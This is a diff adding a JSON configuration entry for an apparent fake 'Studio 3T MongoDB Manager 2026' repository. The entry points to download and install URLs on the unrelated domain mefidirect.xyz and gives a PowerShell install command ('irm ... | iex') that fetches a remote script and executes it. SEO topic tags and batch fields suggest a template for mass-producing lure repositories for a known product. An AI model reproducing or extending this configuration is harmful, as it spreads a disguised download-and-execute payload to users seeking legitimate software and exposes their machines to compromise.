@@ -1,0 +1,29 @@
+{
+  "repo": "studio-3t-mongodb-manager-2026",
+  "product": "Studio 3T MongoDB Manager 2026",
+  "kind": "database",
+  "install_type": "download",
+  "download_url": "https://studio-3t.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "database",
+  "topics": [
+    "studio-3t-edition",
+    "studio-3t-suite",
+    "studio-3t-database-client",
+    "studio-3t-windows-11",
+    "studio-3t-update-fix",
+    "install-studio-3t-on-pc",
+    "studio-3t-sql-workbench",
+    "studio-3t-workstation",
+    "studio-3t-getting-started",
+    "studio-3t-guide-2026",
+    "studio-3t-pc-setup",
+    "desktop-tools",
+    "setup-guide",
+    "sql-tools",
+    "pc-software"
+  ]
+}
